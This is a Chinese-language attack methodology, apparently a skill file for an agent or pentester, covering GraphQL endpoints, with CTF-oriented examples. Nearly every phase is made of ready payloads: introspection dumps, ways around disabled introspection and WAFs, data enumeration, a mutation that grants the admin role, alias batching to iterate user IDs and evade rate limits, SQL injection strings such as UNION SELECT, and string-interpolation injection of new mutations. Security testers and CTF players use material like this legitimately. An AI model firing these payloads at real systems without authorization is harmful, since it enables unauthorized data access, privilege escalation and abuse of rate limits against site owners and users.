---
name: graphql-methodology
description: "GraphQL API 安全测试。当发现 /graphql 端点、POST JSON 查询、GraphQL Playground/Explorer 页面、响应中有 data/errors JSON 结构时使用。包含 Introspection 泄露、注入攻击、权限绕过、嵌套查询 DoS"
metadata:
  tags: "graphql,graphql injection,api,introspection,injection,authorization"
  category: "exploit"
---

# GraphQL 攻击execution-framework


## Phase 1: 发现GraphQL端点
常见路径: `/graphql`, `/api/graphql`, `/graphiql`, `/v1/graphql`, `/query`
检测: POST `{"query":"{ __typename }"}` → 返回 `{"data":{"__typename":"Query"}}` 即确认

## Phase 2: Introspection 查询（最重要）
获取完整Schema:
```json
{"query":"{ __schema { types { name fields { name type { name } } } } }"}
```

精简版（只看Query和Mutation）:
```json
{"query":"{ __schema { queryType { fields { name args { name type { name } } } } mutationType { fields { name args { name type { name } } } } } }"}
```

**Introspection结果包含所有类型定义和字段** — 这是最重要的信息源

### 2.1 Introspection 被禁用时的绕过

**方法 1: Field Suggestion（字段建议）**
GraphQL 引擎对拼写错误会建议正确字段名：
```json
{"query":"{ __typena }"}
→ "Did you mean '__typename'?"
```
利用这个特性枚举字段：发送错误的字段名，从建议中获取真实字段名。

**方法 2: GET 请求绕过**
有些 WAF 只拦截 POST 的 Introspection，用 GET 绕过：
```
GET /graphql?query={__schema{types{name,fields{name}}}}
```

**方法 3: 别名/Fragment 绕过**
```json
{"query":"{ a: __schema { types { name } } }"}
{"query":"fragment f on __Schema { types { name } } { __schema { ...f } }"}
```

**方法 4: 空白/换行变体**
```json
{"query":"\n{ __schema\n{ types\n{ name } } }"}
```

> GraphQL 字段名大小写敏感，标准 introspection 字段是 `__schema`；`__SCHEMA` 不是有效的大小写绕过。

**方法 5: 逐字段猜测**
如果以上都不行，根据常见命名猜测：
```json
{"query":"{ user { id } }"}
{"query":"{ users { id } }"}
{"query":"{ flag }"}
{"query":"{ admin { flag } }"}
{"query":"{ getUser(id:1) { id } }"}
```

## Phase 3: 数据枚举
根据Schema逐个查询:
```json
{"query":"{ users { id username email role } }"}
{"query":"{ user(id: 1) { id username email role flag } }"}
{"query":"{ flag }"}
{"query":"{ admin { flag } }"}
{"query":"{ posts { id title content author } }"}
```
注意隐藏字段（Schema中有但页面未展示的字段）

## Phase 4: 权限绕过
1. 直接查询管理字段:
   ```json
   {"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}
   ```
2. 嵌套查询（Batch攻击）:
   ```json
   {"query":"{ user(id:1){flag} user2:user(id:2){flag} }"}
   ```
3. 别名遍历ID:
   ```json
   {"query":"{ u1:user(id:1){id,name,flag} u2:user(id:2){id,name,flag} u3:user(id:3){id,name,flag} }"}
   ```

## Phase 5: 注入
GraphQL参数中的SQL注入:
```json
{"query":"{ user(name: \"admin' OR '1'='1\") { id flag } }"}
{"query":"{ search(keyword: \"' UNION SELECT flag FROM flags--\") { results } }"}
```

## Phase 6: 高级技巧
- 工具辅助：Clairvoyance、graphql-cop 等自动化工具帮助发现隐藏字段
- 批量查询（Batching）：单个查询中一次请求多个结果 `{a:user(id:1){name} b:user(id:2){name}}`
- WAF 绕过：URL 编码（`%7B`）编码绕过；换行/空格变体

---

## CTF GraphQL 技巧补充

### 别名批量操作绕过速率限制
单个请求中用别名重复同一 mutation（如投票/认证）绕过频率限制：
```graphql
mutation {
  a1: vote(id: "target") { ok }
  a2: vote(id: "target") { ok }
  # 重复 N 次...
}
```
也可用数组批量: `POST body: [{"query":"mutation{...}"}, {"query":"mutation{...}"}, ...]`

### 字符串插值注入
当服务端拼接 GraphQL 查询字符串时，类似 SQLi 的注入：
```javascript
// 输入: ") { result } } mutation { adminAction(secret: true) { flag } } #
// 闭合原查询并注入新 mutation
```
